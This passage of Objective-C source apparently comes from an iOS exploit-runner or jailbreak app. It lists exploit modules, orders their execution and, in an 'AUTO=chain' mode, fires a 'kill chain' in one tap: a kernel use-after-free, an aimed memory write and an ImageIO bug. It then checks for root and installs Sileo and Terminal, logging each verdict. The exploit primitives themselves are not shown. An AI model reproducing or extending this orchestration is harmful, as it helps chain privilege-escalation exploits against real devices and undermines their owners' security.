            } else {
                AveLog(@"[!] AUTO=all: nothing preselected");
            }
            return YES;
        }
        if ([want isEqualToString:@"ROOT"]) {
            BOOL have = RootProbe();
            AveLog(have ? @"[***] ROOT IS PRESENT: uid=0 confirmed" : @"[-] no root: uid!=0 everywhere");
            AvePost([NSString stringWithFormat:@"AUTOROOT %@", have ? @"YES" : @"NO"]);
            return YES;
        }
        // AUTO=chain: the whole kill chain in ONE tap, kernel side first
        // (112477 registry UAF - the only kernel primitive), then the
        // in-process aimed write (112611: CONFIRMED on this build), then the
        // crash-prone ImageIO path (86950) LAST so its verdict still lands.
        if ([want isEqualToString:@"chain"]) {
            NSString *chainNames[] = { @"112477", @"112611 force write", @"86950" };
            for (int ci = 0; ci < 3; ci++) {
                for (NSUInteger i = 0; i < self.modules.count; i++) {
                    if ([self.modules[i][@"name"] rangeOfString:chainNames[ci]].location != NSNotFound) {
                        [self.selected addIndex:i];
                        AveLog([NSString stringWithFormat:@"[*] chain-selected %@", self.modules[i][@"name"]]);
                        break;
                    }
                }
            }
            if (self.selected.count) {
                [self.table reloadData]; [self updateRunTitle]; [self run];
            } else {
                AveLog(@"[!] AUTO=chain: no chain module found");
            }
            return YES;
        }
        for (NSUInteger i = 0; i < self.modules.count; i++) {
            NSString *nm = self.modules[i][@"name"];
            if ([nm rangeOfString:want].location != NSNotFound) {
                [self.selected addIndex:i];
                AveLog([NSString stringWithFormat:@"[*] auto-selected %@", nm]);
                break;
            }
        }
        if (self.selected.count) {
            [self.table reloadData];
            [self updateRunTitle];
            [self run];
        } else {
            AveLog(@"[!] AUTO: module not found");
        }
    }
    return YES;
}

- (void)showLog:(UIButton *)sender {
    if (!g_mainVC.presentedViewController) {
        RSTextVC *lv = [[RSTextVC alloc] init];
        lv.modalPresentationStyle = UIModalPresentationPageSheet;
        [g_mainVC presentViewController:lv animated:YES completion:nil];
    }
}

- (void)updateRunTitle {
    [self.runButton setTitle:[NSString stringWithFormat:@"Run selected  (%lu)",
                              (unsigned long)self.selected.count] forState:UIControlStateNormal];
}

- (NSInteger)tableView:(UITableView *)tv numberOfRowsInSection:(NSInteger)s { return self.modules.count; }

- (UITableViewCell *)tableView:(UITableView *)tv cellForRowAtIndexPath:(NSIndexPath *)ip {
    ModuleCell *c = [tv dequeueReusableCellWithIdentifier:@"c" forIndexPath:ip];
    [c configure:self.modules[ip.row] selected:[self.selected containsIndex:ip.row]];
    return c;
}

- (void)tableView:(UITableView *)tv didSelectRowAtIndexPath:(NSIndexPath *)ip {
    [tv deselectRowAtIndexPath:ip animated:YES];
    if ([self.selected containsIndex:ip.row]) [self.selected removeIndex:ip.row];
    else [self.selected addIndex:ip.row];
    [self.table reloadData]; [self updateRunTitle];
    AveLog([NSString stringWithFormat:@"[*] %@ %@",
            [self.selected containsIndex:ip.row] ? @"selected" : @"cleared", self.modules[ip.row][@"name"]]);
}

- (void)toggleAll {
    if (self.selected.count == self.modules.count) [self.selected removeAllIndexes];
    else [self.selected addIndexesInRange:NSMakeRange(0, self.modules.count)];
    [self.table reloadData]; [self updateRunTitle];
    AveLog([NSString stringWithFormat:@"[*] selected count %lu", (unsigned long)self.selected.count]);
}

// MARK: installers (Sileo / Terminal)
- (void)installer:(UIButton *)b {
    if (self.running) return;
    self.running = YES; b.enabled = NO;
    NSString *which = (b.tag == 1001) ? @"Sileo" : @"Terminal";
    AveLog([NSString stringWithFormat:@"\n : %@", which]);
    AvePost([NSString stringWithFormat:@"INSTALL %@", which]);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *v = (b.tag == 1001) ? InstallSileo() : InstallTerminal();
        AveLog([NSString stringWithFormat:@"    %@", v]);
        AvePost([NSString stringWithFormat:@"INSTALLVERDICT %@ => %@", which, v]);
        refreshRootPill();
        dispatch_async(dispatch_get_main_queue(), ^{ self.running = NO; b.enabled = YES; });
    });
}

// MARK: run
- (void)run {
    if (self.running) return;
    if (self.selected.count == 0) { AveLog(@"[!] nothing selected"); return; }
    self.running = YES; self.runButton.enabled = NO;
    [self.runButton setTitle:@"running..." forState:UIControlStateNormal];
    AveLog([NSString stringWithFormat:@"\n=== RUN: %lu  ===", (unsigned long)self.selected.count]);
    AvePost([NSString stringWithFormat:@"RUN n=%lu", (unsigned long)self.selected.count]);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        // The heavy JSC/JSContext modules run FIRST: the UAF trigger loops up
        // to 10000 GC rounds and can take several minutes, so when they land
        // in the middle of the queue their verdict often never makes it out.
        NSUInteger total = self.modules.count;
        NSMutableArray *order = [NSMutableArray arrayWithCapacity:total];
        for (NSUInteger i = 0; i < total; i++) {
            NSString *nm = self.modules[i][@"name"];
            if ([nm hasPrefix:@"JSC "] || [nm hasPrefix:@"Unified"]) [order addObject:@(i)];
        }
        for (NSUInteger i = 0; i < total; i++) {
            if (![order containsObject:@(i)]) [order addObject:@(i)];
        }
        for (NSUInteger k = 0; k < total; k++) {
            NSUInteger idx = [order[k] unsignedIntegerValue];
            if (![self.selected containsIndex:idx]) continue;
            NSDictionary *m = self.modules[idx];
            AveLog([NSString stringWithFormat:@"\n %@ [%@]", m[@"name"], m[@"status"]]);
            AveSetStatus(@"working...");
            AvePost([NSString stringWithFormat:@"MOD %@", m[@"name"]]);
            CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
            NSString *v = nil;
            @try {
                v = ((ExploitBlock)m[@"block"])();
            } @catch (NSException *e) {
                // one module must never take the whole run down
                v = [NSString stringWithFormat:@"[module threw] %@", e.reason];
                AveLog([NSString stringWithFormat:@"    !! %@", v]);
            }
            double ms = (CFAbsoluteTimeGetCurrent() - t0) * 1000.0;
            AveLog([NSString stringWithFormat:@"    %@   (%.0f )", v ?: @"( )", ms]);
            AvePost([NSString stringWithFormat:@"VERDICT %@ => %@", m[@"name"], v ?: @"nil"]);
        }
        refreshRootPill();
        dispatch_async(dispatch_get_main_queue(), ^{
            AveLog(@"=== DONE ===");
            AvePost(@"RUN done");
            self.running = NO; self.runButton.enabled = YES;
            [self updateRunTitle];
        });
    });
}
@end
